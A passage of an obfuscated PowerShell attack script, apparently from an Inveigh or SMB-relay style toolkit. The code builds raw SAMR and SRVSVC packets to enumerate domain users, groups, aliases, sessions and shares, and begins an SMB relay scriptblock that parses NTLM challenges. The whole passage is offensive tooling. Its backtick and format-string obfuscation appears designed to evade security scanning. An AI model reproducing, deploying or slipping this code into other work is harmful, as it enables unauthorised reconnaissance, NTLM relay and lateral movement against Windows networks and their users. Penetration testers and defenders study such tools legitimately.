    ${LS`A`lOoKUpSi`DS}.("{0}{1}"-f'Ad','d').Invoke(("{6}{2}{3}{4}{1}{0}{7}{5}" -f'_NULL','Names','i','nterT','o','inter','Po','_po'),[Byte[]](0x00,0x00,0x00,0x00))
    ${lSa`l`oOkUPSI`Ds}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}{4}{3}" -f 'ames_l','nterToN','Poi','l','eve'),[Byte[]](0x01,0x00))
    ${LSa`lO`okuPS`I`ds}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{2}"-f'Pointer','To','Count'),[Byte[]](0x00,0x00))
    ${LSAL`Oo`Ku`P`sids}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}{4}" -f 'o','Po','c','interToCount_','unt'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${LSAL`OokuPSI`Ds}
}



function NEW-Pa`CKe`T`SAmR`c`O`NNEcT2
{
    param([String]${SYSt`Emna`mE})

    [Byte[]]${s`ySTem`_naMe} =   ( L`s  vARiAbLe:IxGD ).vALUE::"Un`Ico`de".("{0}{1}"-f'GetB','ytes').Invoke(${sYS`TE`MNa`ME})
    [Byte[]]${mAX`_`cOU`NT} =  $xv8QnB::("{0}{1}" -f'GetB','ytes').Invoke(${s`yS`TEM`NamE}."LEng`TH" + 1)

    if(${s`YStemnA`mE}."l`ENG`Th" % 2)
    {
        ${S`YS`Tem`_Name} += 0x00,0x00
    }
    else
    {
        ${S`YSteM`_`NaMe} += 0x00,0x00,0x00,0x00
    }

    ${sAmrcO`NNEC`T2} = nEw-o`B`Ject ("{3}{5}{6}{9}{4}{8}{10}{0}{2}{1}{7}" -f 'ns','Or','.Specialized.','Syst','ol','e','m','deredDictionary','le','.C','ctio')
    ${samR`C`on`NECT2}.("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{5}{4}{7}{6}{3}{2}{8}"-f'o','P','n','e','erToSys','int','r','temName_Refe','tID'),[Byte[]](0x00,0x00,0x02,0x00))
    ${sa`m`RCONnE`cT2}.("{0}{1}"-f'A','dd').Invoke(("{0}{3}{4}{1}{2}" -f 'PointerTo','ame_','MaxCount','S','ystemN'),${M`AX_`COuNt})
    ${s`A`M`RCOnN`ect2}.("{1}{0}" -f'd','Ad').Invoke(("{5}{1}{2}{0}{3}{6}{4}"-f 'N','ToSy','stem','ame_Of','et','Pointer','fs'),[Byte[]](0x00,0x00,0x00,0x00))
    ${sAm`RcON`NEc`T2}.("{0}{1}" -f 'Ad','d').Invoke(("{8}{4}{3}{0}{6}{5}{7}{2}{1}" -f'_','t','oun','oSystemName','interT','ual','Act','C','Po'),${M`Ax`_c`ouNt})
    ${SaMrcON`Nec`T2}.("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}{4}{3}{5}"-f 'Po','interToSy','stemName_Syst','Nam','em','e'),${S`YSTeM`_n`Ame})
    ${S`A`mR`cOnNEC`T2}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}" -f 'ask','cessM','Ac'),[Byte[]](0x00,0x00,0x00,0x02))

    return ${sAMr`c`o`NNECt2}
}

function New-PAcKeT`SA`m`Rco`NneCT5
{
    param([String]${sY`st`EMNaMe})

    ${SY`stE`m`Name} = "\\" + ${SYS`TEm`NA`Me}
    [Byte[]]${SYStEM_`N`AmE} =  ( ge`T-varI`ABLE ('ix'+'gD') -vaLuE  )::"UniC`O`de".("{0}{2}{1}"-f 'GetB','es','yt').Invoke(${Sy`s`Te`mnAMe})
    [Byte[]]${maX`_`coU`Nt} =  ( v`A`RIaBle  xv8Qnb  -Va  )::("{1}{2}{0}" -f 'es','G','etByt').Invoke(${s`yS`T`EMnaME}."L`engTH" + 1)

    if(${syS`TE`MNAMe}."l`engTH" % 2)
    {
        ${Sy`s`Tem_`NAME} += 0x00,0x00
    }
    else
    {
        ${SY`stem_`N`AMe} += 0x00,0x00,0x00,0x00
    }

    ${S`AMRcoNn`eC`T5} = nE`W-OB`jECT ("{2}{1}{8}{9}{4}{5}{3}{7}{6}{0}"-f 'tionary','ystem.Co','S','Or','cialized','.','edDic','der','lle','ctions.Spe')
    ${sA`MRcoN`NecT5}.("{1}{0}" -f'dd','A').Invoke(("{0}{6}{5}{1}{4}{3}{2}" -f'Point','R','D','tI','eferen','e_','erToSystemNam'),[Byte[]](0x00,0x00,0x02,0x00))
    ${s`AmRC`OnNecT5}.("{1}{0}"-f'd','Ad').Invoke(("{5}{4}{7}{0}{1}{8}{6}{3}{2}" -f'rT','oS','t','Coun','int','Po','ame_Max','e','ystemN'),${MaX_C`Ou`Nt})
    ${SA`MrC`On`Ne`cT5}.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{5}{6}{2}{1}{3}" -f 'Syst','ff','me_O','set','PointerTo','em','Na'),[Byte[]](0x00,0x00,0x00,0x00))
    ${s`A`mrcON`N`ect5}.("{1}{0}"-f'd','Ad').Invoke(("{3}{1}{0}{7}{6}{5}{2}{4}{8}" -f 'rT','nte','A','Poi','ctualC','me_','a','oSystemN','ount'),${m`Ax_c`O`Unt})
    ${saMrcONN`E`ct5}.("{1}{0}"-f 'dd','A').Invoke(("{5}{7}{4}{3}{6}{1}{0}{2}" -f'a','mN','me','S','e_','PointerT','yste','oSystemNam'),${SYS`TEM`_NA`Me})
    ${S`AmRcOnN`eCt5}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}" -f'k','Ac','cessMas'),[Byte[]](0x00,0x00,0x00,0x02))
    ${S`A`mrconn`E`Ct5}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f 'Le','velIn'),[Byte[]](0x01,0x00,0x00,0x00))
    ${Sam`RCo`NNECT5}.("{0}{1}"-f'Ad','d').Invoke(("{3}{4}{6}{1}{5}{0}{2}" -f'tInf','RConne','o_InfoIn','P','ointerToInfoIn_SA','c','M'),[Byte[]](0x01,0x00,0x00,0x00))
    ${sAM`RC`ONNe`cT5}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{9}{11}{4}{10}{8}{5}{2}{6}{3}{1}{12}{7}" -f'Poin','li','foI','1_C','n_SAMRCo','nfo_In','n','Version','I','terTo','nnect','InfoI','ent'),[Byte[]](0x02,0x00,0x00,0x00))
    ${s`A`M`R`COnnEcT5}.("{1}{0}"-f'dd','A').Invoke(("{9}{5}{2}{4}{1}{6}{7}{3}{0}{8}"-f'ectInfo_InfoIn1_Un','oInfoIn_SAMR','nt','n','erT','oi','C','on','known','P'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${saMrcoN`N`eCT5}
}

function nEw`-PACK`eTSAMRgetMEM`BeRs`iN`A`L`ias
{
    param([Byte[]]${H`Andle})

    ${sa`MRGETm`EMbe`RsiNaL`IAS} = NE`w-ob`JecT ("{3}{8}{7}{2}{6}{4}{0}{1}{5}"-f'd','Di','Speci','S','ed.Ordere','ctionary','aliz','ons.','ystem.Collecti')
    ${Sa`m`R`Get`MEMBersi`NalIas}.("{0}{1}"-f'Ad','d').Invoke(("{2}{0}{3}{1}" -f'rToConn','ctHandle','Pointe','e'),${HAN`d`LE})

    return ${SaMrgEtME`MB`eRsi`NALI`AS}
}

function New-pAC`K`E`T`SA`MR`clOsE
{
    param([Byte[]]${HANd`Le})

    ${s`Am`RclOsE} = nE`W-oBJ`eCT ("{7}{3}{12}{9}{1}{8}{10}{4}{6}{11}{0}{5}{2}" -f 'eredD','llect','y','stem.','i','ictionar','z','Sy','ions.Spec','o','ial','ed.Ord','C')
    ${saMr`C`lOse}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{4}{3}{0}"-f'tHandle','oi','P','oConnec','nterT'),${hanD`LE})

    return ${s`AMR`cL`osE}
}

function New-p`ACketS`Am`R`Ope`Nal`I`AS
{
    param([Byte[]]${H`A`NDle},[Byte[]]${r`id})

    ${S`AMr`Ope`Na`lIas} = NEW-`obJ`E`CT ("{4}{5}{9}{2}{0}{3}{1}{7}{6}{10}{8}"-f 'ze','Ord','peciali','d.','System','.Collect','edDict','er','ary','ions.S','ion')
    ${SAm`ROpe`NAL`IaS}.("{0}{1}" -f'A','dd').Invoke(("{1}{6}{0}{5}{4}{2}{3}"-f 'rTo','P','and','le','onnectH','C','ointe'),${Han`DLE})
    ${saM`RoP`e`NALIAs}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}{3}" -f'essMas','Ac','c','k'),[Byte[]](0x00,0x00,0x00,0x02))
    ${S`AMRoP`EnaL`iaS}.("{0}{1}"-f 'Ad','d').Invoke("RID",${r`ID})

    return ${s`AmROpenaL`iAS}
}

function NEW-pac`Ke`TSam`R`OPe`N`GrOUP
{
    param([Byte[]]${H`ANdle},[Byte[]]${r`ID})

    ${SaMROpe`N`G`ROup} = New`-Obj`e`cT ("{8}{2}{10}{11}{1}{9}{3}{12}{6}{0}{7}{4}{5}" -f'Di','s.Sp','em.C','ed.O','r','y','red','ctiona','Syst','ecializ','ol','lection','rde')
    ${S`A`m`RoPeNGrOUP}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}{3}" -f'Pointe','ToConnectHandl','r','e'),${H`ANdlE})
    ${S`AmR`OpENg`ROup}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{3}{2}" -f 'Acce','ss','sk','Ma'),[Byte[]](0x00,0x00,0x00,0x02))
    ${sa`MRoPeNgr`o`Up}.("{1}{0}" -f 'd','Ad').Invoke("RID",${r`Id})

    return ${S`AMr`OpE`N`GrouP}
}

function NEW-pa`C`KETSAmRqU`E`RygRo`U`pMEmBeR
{
    param([Byte[]]${Ha`NdLE})

    ${sAm`R`qU`E`RygROUpMemBer} = NEW-`oB`JeCT ("{4}{2}{7}{8}{1}{9}{10}{5}{3}{0}{6}" -f 'cti','.','yst','i','S','ed.OrderedD','onary','em.Coll','ections','Special','iz')
    ${SAM`RQ`Ue`R`YgRoUP`mEMBEr}.("{1}{0}" -f'dd','A').Invoke(("{2}{1}{3}{0}{4}"-f'roup','n','Poi','terToG','Handle'),${HA`ND`le})

    return ${SA`Mr`quER`yGr`OUpme`MB`er}
}

function nEW`-P`AC`KETSaMrO`pen`d`oMaiN
{
    param([Byte[]]${hAn`D`lE},[Byte[]]${sIdc`ounT},[Byte[]]${S`Id})

    ${SAm`RoPend`om`AIn} = new`-obJE`cT ("{0}{10}{1}{11}{5}{2}{7}{14}{3}{6}{9}{12}{13}{4}{8}" -f 'S','.C','pecial','r','nar','ions.S','edDi','i','y','c','ystem','ollect','ti','o','zed.Orde')
    ${SAmRo`pENdOMa`In}.("{1}{0}"-f 'dd','A').Invoke(("{2}{4}{3}{0}{1}" -f 'nnectHand','le','P','rToCo','ointe'),${h`AN`dlE})
    ${saMROPen`Do`m`AIN}.("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{1}{2}"-f 'ccessM','as','k','A'),[Byte[]](0x00,0x00,0x00,0x02))
    ${s`AmRope`ND`O`MAIn}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{2}{0}" -f't','ter','ToSid_Coun','Poin'),${sI`D`COU`NT})
    ${sa`M`RO`PEnD`OMain}.("{1}{0}"-f'dd','A').Invoke(("{3}{1}{0}{2}" -f 'i','rToSid_S','d','Pointe'),${s`iD})

    return ${sA`mr`op`eNDOm`Ain}
}

function NEW`-PaCkeTsaMR`ENu`M`DoMAINUseRs
{
    param([Byte[]]${H`An`dle})

    ${saMr`eN`UmDoM`AinuS`ErS} = Ne`w`-obj`EcT ("{2}{8}{10}{3}{1}{0}{4}{5}{9}{6}{7}" -f'lized','lections.Specia','Sys','ol','.Ord','e','dDi','ctionary','t','re','em.C')
    ${SA`Mr`ENuMdOMAi`N`UseRS}.("{1}{0}" -f'dd','A').Invoke(("{2}{4}{3}{5}{0}{1}"-f 'an','dle','Point','rTo','e','DomainH'),${H`AND`LE})
    ${S`AmRE`NUmdOmAI`NuSerS}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{5}{0}{4}{2}{1}" -f 'rTo','umeHandle','s','Po','Re','inte'),[Byte[]](0x00,0x00,0x00,0x00))
    ${s`AmR`EnuMDO`M`AIN`UsERs}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}"-f'tFlags','Ac','c'),[Byte[]](0x10,0x00,0x00,0x00))
    ${s`AMrEN`U`MDom`AI`Nu`sERs}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}"-f 'Max','Size'),[Byte[]](0xff,0xff,0x00,0x00))

    return ${SamrEn`UM`D`oMainU`sers}
}

function NEw-`pAcKE`TsA`Mrl`OOkupn`A`m`Es
{
    param([Byte[]]${ha`N`Dle},[String]${n`A`mes})

    [Byte[]]${N`AmEs_bY`T`Es} =   (  vA`Ri`ABlE ixGd  -VaLUeonL)::"unI`c`ODe".("{1}{0}"-f'tes','GetBy').Invoke(${nAm`Es})
    [Byte[]]${NAM`E`_LEN} = (  (G`ET-`VaRia`BlE  ('XV8'+'QnB')  -vALueo  )::("{1}{0}{2}"-f 'tB','Ge','ytes').Invoke(${NAm`E`S_bYTEs}."lEN`Gth"))[0,1]
    [Byte[]]${Max_`c`oUnt} =   (  V`ARiable  ("x"+"V8"+"qnB")  -VALUe )::("{1}{0}"-f 'Bytes','Get').Invoke(${NAm`eS}."LeN`Gth")

    ${SamR`LO`o`kuPn`Ames} = NeW`-oBJ`ecT ("{8}{6}{0}{4}{7}{1}{2}{3}{5}"-f'.C','redDi','ctio','nar','ollections.Specialized.O','y','stem','rde','Sy')
    ${sAM`R`lOOkupN`AMes}.("{1}{0}" -f'dd','A').Invoke(("{1}{5}{2}{3}{4}{0}" -f'e','Poi','oDomai','n','Handl','nterT'),${Ha`ND`Le})
    ${s`AmrlOok`UPNam`ES}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}" -f's','umName','N'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SaM`RlOokUP`NamEs}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{5}{4}{2}{3}"-f 'Poin','te','MaxC','ount','ToNames_','r'),[Byte[]](0xe8,0x03,0x00,0x00))
    ${Sa`MrLo`OK`UPNaMEs}.("{1}{0}"-f'dd','A').Invoke(("{0}{3}{2}{1}{4}"-f'PointerT','_Offs','es','oNam','et'),[Byte[]](0x00,0x00,0x00,0x00))
    ${s`A`mrloOKupnamES}.("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}{3}{4}{5}"-f 'Names_A','ctual','PointerTo','C','oun','t'),[Byte[]](0x01,0x00,0x00,0x00))
    ${S`AM`Rloo`kuPNameS}.("{0}{1}"-f'Ad','d').Invoke(("{4}{2}{3}{0}{1}" -f 'Name','Len','s_Nam','es_','PointerToName'),${NaME`_LEn})
    ${S`A`mRl`oO`kupnAmES}.("{0}{1}"-f'Ad','d').Invoke(("{6}{2}{4}{5}{3}{1}{0}"-f'ze','Si','s_N','_Name','a','mes','PointerToName'),${n`AME`_leN})
    ${S`AmrLOOku`pNA`mEs}.("{1}{0}"-f 'dd','A').Invoke(("{10}{0}{9}{8}{2}{5}{4}{3}{1}{6}{7}" -f'ToN','_Refer','_N','e','Nam','ames_','en','tID','es','am','Pointer'),[Byte[]](0x00,0x00,0x02,0x00))
    ${SAmRlO`ok`UP`NAMEs}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{6}{4}{5}{7}{3}{0}" -f'Count','terToNa','Poin','ax','mes_N','a','mes_Na','me_M'),${M`AX`_`coUnt})
    ${saM`Rl`OoKu`PnamEs}.("{0}{1}"-f'A','dd').Invoke(("{5}{2}{4}{1}{3}{6}{0}" -f 'Offset','s_','n','Names_Na','terToName','Poi','me_'),[Byte[]](0x00,0x00,0x00,0x00))
    ${saMRl`OOKU`pnaMEs}.("{0}{1}" -f'Ad','d').Invoke(("{1}{7}{6}{5}{3}{8}{0}{2}{4}{9}"-f 'ual','Po','C','s_','ou','_Name','erToNames','int','Name_Act','nt'),${ma`X`_cOUnT})
    ${samrl`O`OkUPN`AMeS}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{4}{1}{5}{8}{6}{3}{7}"-f 'int','_N','Po','e','erToNames','ames_N','am','s','ame_N'),${n`A`M`es_ByTeS})

    return ${sAMr`LOO`kUpn`AMeS}
}

function ne`w-P`AC`keTs`AMRl`Ooku`priDs
{
    param([Byte[]]${HA`Nd`lE},[Byte[]]${RI`d`cOUnT},[Byte[]]${r`iDS})

    ${saMRLo`oK`U`pRids} = New-`objE`Ct ("{13}{6}{14}{8}{7}{4}{2}{9}{1}{3}{0}{5}{11}{10}{12}" -f 'r','Ord','lize','e','ons.Specia','e','l','ti','c','d.','tio','dDic','nary','System.Co','le')
    ${Sam`RloOk`U`Pri`dS}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{2}{4}{3}" -f 'terTo','Poin','DomainHa','le','nd'),${HAn`DlE})
    ${sA`mr`LOO`kUprids}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}" -f'ds','i','NumR'),${R`idC`Ou`Nt})
    ${S`AmR`Lo`OKuP`RIDs}.("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}" -f'Unk','own','n'),[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    ${SaMr`l`Oo`KuPri`dS}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}"-f'Nu','s2','mRid'),${R`I`D`coUnt})
    ${sAmr`lOO`KuPRIDS}.("{1}{0}"-f'd','Ad').Invoke(("{0}{1}" -f'Rid','s'),${Ri`dS})

    return ${S`A`m`RLoOKuPr`IdS}
}


function NEw-`paCkETsR`Vs`VcneT`Se`sseNUM
{
    param([String]${ser`VeR`UNC})

    [Byte[]]${SeRV`e`R_Unc} =  $iXgd::"UNI`CoDE".("{2}{1}{0}" -f 'ytes','tB','Ge').Invoke(${s`erverU`Nc})
    [Byte[]]${mAX`_CO`Unt} =   (G`et-CHI`L`dItEM  ('vaR'+'I'+'abLe'+':Xv'+'8qNB')  ).Value::("{2}{0}{1}" -f 'Byte','s','Get').Invoke(${ser`Ve`RUnC}."len`Gth" + 1)
       
    if(${s`Erve`R`Unc}."lEng`TH" % 2)
    {
        ${S`eRVer_u`Nc} += 0x00,0x00
    }
    else
    {
        ${s`er`VEr`_uNc} += 0x00,0x00,0x00,0x00
    }

    ${SrVSVcn`e`Tse`SS`Enum} = n`EW-oBj`ECT ("{4}{7}{10}{6}{3}{5}{0}{2}{8}{9}{1}{11}"-f 'al','na','ize','ns.S','Sy','peci','ctio','stem.C','d.Order','edDictio','olle','ry')
    ${SrVsV`cN`e`TSeSsENuM}.("{1}{0}"-f 'dd','A').Invoke(("{4}{0}{5}{6}{2}{3}{8}{7}{1}"-f'ointerT','ntID','rver','UNC_Refe','P','oS','e','e','r'),[Byte[]](0x00,0x00,0x02,0x00))
    ${sR`V`sVcn`eTSEssEn`Um}.("{1}{0}" -f 'dd','A').Invoke(("{4}{0}{2}{3}{1}" -f'nterTo','xCount','Se','rverUNC_Ma','Poi'),${mAx_`CO`Unt})
    ${SRVs`V`CnE`TS`Esse`NUM}.("{0}{1}"-f'Ad','d').Invoke(("{2}{5}{3}{6}{4}{0}{1}"-f'se','t','Poin','rverU','_Off','terToSe','NC'),[Byte[]](0x00,0x00,0x00,0x00))
    ${sR`VsvcNe`T`seSs`EnUm}.("{0}{1}" -f 'A','dd').Invoke(("{5}{1}{0}{2}{3}{4}"-f 'n','i','te','rToSe','rverUNC_ActualCount','Po'),${MAx`_C`ount})
    ${SR`Vs`V`cn`Et`seSsenUM}.("{1}{0}" -f 'dd','A').Invoke(("{5}{1}{4}{3}{0}{2}"-f 'UNC_Serve','r','rUNC','r','ve','PointerToSe'),${serv`eR`_`UNC})
    ${SRvS`VCN`E`TsESSENum}.("{1}{0}"-f'dd','A').Invoke(("{0}{3}{4}{2}{5}{1}"-f'Poi','D','rent','nterToCl','ient_Refe','I'),[Byte[]](0x04,0x00,0x02,0x00))
    ${srvsV`cNETS`e`SSenuM}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{3}{5}{4}{1}{0}" -f'MaxCount','_','Poi','n','lient','terToC'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SRVSV`C`NetSE`S`senUM}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{6}{5}{1}{0}{3}"-f'se','f','Poi','t','nterToClien','_Of','t'),[Byte[]](0x00,0x00,0x00,0x00))
    ${SRvsVc`NETS`E`ss`Enum}.("{1}{0}"-f 'dd','A').Invoke(("{5}{1}{3}{4}{2}{7}{6}{0}" -f 't','ToClient_Ac','C','tu','al','Pointer','un','o'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SRv`SVCN`E`TSessENUm}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{3}{2}{0}"-f 'ient','Poin','l','_C','terToClient'),[Byte[]](0x00,0x00))
    ${sRVs`V`cNe`TsesSE`Num}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{4}{3}{0}{2}" -f 'rToU','Poi','ser','te','n'),[Byte[]](0x00,0x00))
    ${sRVS`Vc`N`ets`eSSenUM}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{4}{2}{5}{3}{6}"-f 'oin','P','erToUs','Ref','t','er_','erentID'),[Byte[]](0x08,0x00,0x02,0x00))
    ${sRv`Sv`c`NeTseSsE`N`UM}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{0}{1}{4}"-f 'oU','ser_MaxCoun','Poi','nterT','t'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SR`VSvCne`TsESSe`Num}.("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{4}{3}{5}{0}"-f 'fset','Poin','terT','ser','oU','_Of'),[Byte[]](0x00,0x00,0x00,0x00))
    ${sRv`s`Vcn`EtsE`sSENUm}.("{0}{1}" -f 'A','dd').Invoke(("{5}{6}{7}{3}{4}{0}{2}{1}" -f'r','alCount','_Actu','terT','oUse','P','oi','n'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SrVsv`cNeT`sESS`EnuM}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{0}{3}"-f'ser','PointerT','oU','_User'),[Byte[]](0x00,0x00))
    ${sRVs`Vcn`ets`E`SSen`UM}.("{1}{0}" -f'dd','A').Invoke(("{2}{1}{3}{0}" -f'l','oint','P','erToLeve'),[Byte[]](0x00,0x00))
    ${S`RVSVCn`ET`sESs`ENUM}.("{0}{1}" -f'A','dd').Invoke(("{1}{3}{2}{4}{0}"-f 'el','Pointe','vel','rToLe','_Lev'),[Byte[]](0x0a,0x00,0x00,0x00))
    ${SRVS`VcneT`SEs`senUM}.("{0}{1}"-f'A','dd').Invoke(("{3}{1}{0}{6}{8}{4}{2}{7}{5}"-f'interT','o','sC','P','s','tr','oC','tr_C','tr_NetSe'),[Byte[]](0x0a,0x00,0x00,0x00))
    ${S`RVS`VcNE`TsESsEnuM}.("{1}{0}"-f 'dd','A').Invoke(("{4}{8}{2}{3}{5}{0}{10}{9}{7}{1}{6}" -f'_Pointe','I','_Ne','tS','PointerToC','essCtr','D','t','tr','ToCtr10_Referen','r'),[Byte[]](0x0c,0x00,0x02,0x00))
    ${SRVS`VcN`e`TsES`sE`NuM}.("{0}{1}"-f 'A','dd').Invoke(("{12}{9}{5}{3}{1}{8}{10}{6}{11}{2}{0}{7}{4}"-f'r10','etSe','r10_Ct','N','nt','oCtr_','e','_Cou','ssCtr_Po','erT','int','rToCt','Point'),[Byte[]](0x00,0x00,0x00,0x00))
    ${sRv`S`VCnET`sEs`SE`NUM}.("{1}{0}" -f'd','Ad').Invoke(("{6}{1}{4}{3}{9}{5}{0}{2}{7}{10}{11}{8}" -f 'oCtr10_C','ointerToC','tr1','sCtr_Poin','tr_NetSes','T','P','0_Null','er','ter','Poin','t'),[Byte[]](0x00,0x00,0x00,0x00))
    ${SR`VsVcN`Et`s`ESSEnum}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{3}{2}{1}" -f 'Ma','r','e','xBuff'),[Byte[]](0xff,0xff,0xff,0xff))
    ${Sr`V`sVcneTSEs`se`NuM}.("{1}{0}" -f'd','Ad').Invoke(("{3}{5}{7}{1}{6}{4}{8}{0}{2}"-f 'r','esumeH','entID','Poi','dle_Re','nterT','an','oR','fe'),[Byte[]](0x10,0x00,0x02,0x00))
    ${sRVSvcn`ET`SEs`SeNUm}.("{1}{0}" -f 'dd','A').Invoke(("{2}{5}{1}{8}{7}{4}{0}{6}{3}"-f'sumeHa','eH','Poi','e','e','nterToResum','ndl','ndle_R','a'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${S`Rv`sV`cNEtSE`SSE`NUm}
}

function new-PAC`k`e`T`srv`SVc`NeTSh`AReE`Nu`MALl
{
    param([String]${s`E`RVeRuNc})

    ${S`erVeR`U`NC} = "\\" + ${S`Erv`eRu`NC}
    [Byte[]]${S`ER`VeR_u`Nc} =   (  G`CI vArIable:iXgd  ).vALUE::"uNIC`o`De".("{0}{1}{2}"-f 'GetB','yte','s').Invoke(${sERv`eR`UNC})
    [Byte[]]${mAx_`cOu`NT} =  (G`Et-v`Ar`IablE  ('XV8q'+'nB') ).VaLue::("{2}{0}{1}" -f'tBy','tes','Ge').Invoke(${S`eRve`RUnC}."lenG`Th" + 1)

    if(${sE`RVer`Unc}."l`EnGth" % 2)
    {
        ${s`ERV`Er_uNc} += 0x00,0x00
    }
    else
    {
        ${sE`R`VER`_uNC} += 0x00,0x00,0x00,0x00
    }

    ${s`RVSv`CNETsh`Aree`NUm} = ne`w-ObJ`E`Ct ("{0}{4}{11}{2}{3}{9}{5}{10}{7}{12}{1}{8}{6}"-f'Sys','eredDi','Collec','ti','t','s.Sp','ary','iali','ction','on','ec','em.','zed.Ord')
    ${sRvSvC`NEtsH`Ar`e`ENUm}.("{1}{0}" -f'd','Ad').Invoke(("{4}{5}{6}{3}{0}{1}{2}"-f 'Refe','re','ntID','ServerUNC_','Poin','ter','To'),[Byte[]](0x00,0x00,0x02,0x00))
    ${SrvsvcNeTSh`AR`e`Enum}.("{0}{1}" -f'Ad','d').Invoke(("{0}{4}{3}{1}{2}"-f 'Poin','UNC_MaxC','ount','ToServer','ter'),${M`Ax_`cO`Unt})
    ${s`RVsvCnEt`sH`A`REen`UM}.("{1}{0}" -f'dd','A').Invoke(("{0}{2}{3}{6}{7}{4}{1}{5}" -f'PointerTo','e','Serv','erU','fs','t','N','C_Of'),[Byte[]](0x00,0x00,0x00,0x00))
    ${SrVS`VCNE`TshaRE`EN`Um}.("{1}{0}" -f 'dd','A').Invoke(("{2}{8}{3}{7}{1}{0}{5}{6}{4}"-f 'UNC','r','Pointe','Se','nt','_Actua','lCou','rve','rTo'),${m`Ax`_`coUNt})
    ${s`RvsVc`NetS`hAreeNum}.("{0}{1}"-f 'A','dd').Invoke(("{3}{4}{6}{7}{5}{2}{0}{1}" -f 've','rUNC','er','Po','in','S','terToServ','erUNC_'),${sE`Rv`er_UNc})
    ${s`R`VsVc`NEt`SHAr`EEN`UM}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}{3}" -f 'evel_','PointerToL','Leve','l'),[Byte[]](0x01,0x00,0x00,0x00))
    ${SRv`sv`CNe`TSH`ArEENUM}.("{0}{1}"-f'Ad','d').Invoke(("{0}{5}{2}{3}{4}{1}" -f 'Poin','tr_Ctr','tr_Net','Shar','eC','terToC'),[Byte[]](0x01,0x00,0x00,0x00))
    ${sRv`sV`cNE`T`sh`AreenuM}.("{0}{1}" -f'Ad','d').Invoke(("{4}{0}{7}{5}{2}{3}{6}{1}" -f 'Ct','D','nte','r_Referen','PointerTo','hareCtr_Poi','tI','r_NetS'),[Byte[]](0x04,0x00,0x02,0x00))
    ${SrvsVc`Ne`TsHARE`enUm}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{5}{3}{4}{2}{6}{0}" -f 'Count','PointerToCtr_','1','tShareCtr','_Pointer_Ctr','Ne','_'),[Byte[]](0x00,0x00,0x00,0x00))
    ${sr`VsvCneT`sh`ArE`eN`Um}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{9}{7}{4}{12}{0}{6}{3}{1}{5}{11}{10}{8}" -f'o','r','P','nte','NetShare','_','i','tr_','er','ointerToC','t','NullPoin','Ctr_P'),[Byte[]](0x00,0x00,0x00,0x00))
    ${srv`S`Vc`NeT`s`hAREenum}.("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}"-f 'axBuf','fer','M'),[Byte[]](0xff,0xff,0xff,0xff))
    ${SR`V`SVc`NET`sHArEeNUm}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f'D','eferentI','R'),[Byte[]](0x08,0x00,0x02,0x00))
    ${srVSvCNet`Sh`A`ReeN`UM}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{3}{1}"-f'Res','andle','u','meH'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${SRV`SvcneTSh`Aree`NUM}
}
    
}


${SM`B_R`EL`Ay_`FUNCtIonS_SCRi`ptb`lO`Ck} =
{

    function GeT`-SMbNTLmcH`A`L`lE`NGe
    {
        param ([Byte[]]${p`AylOaD})

        ${p`AyLoAD_`c`oNVER`Ted} =   (  D`iR  ("va"+"RiaBle:x"+"V8qn"+"b") ).VALuE::("{1}{2}{0}" -f'ing','T','oStr').Invoke(${pA`yload})
        ${Pa`ylOaD_CO`N`VeRtED} = ${Pa`yloAd_`Co`NVeRT`Ed} -replace "-",""
        ${nTLM`_`indeX} = ${PA`y`lOa`D_`coNVERt`ED}.("{0}{1}"-f'I','ndexOf').Invoke(("{4}{0}{2}{1}{3}" -f 'E5','D5353500','44C4','0','4'))

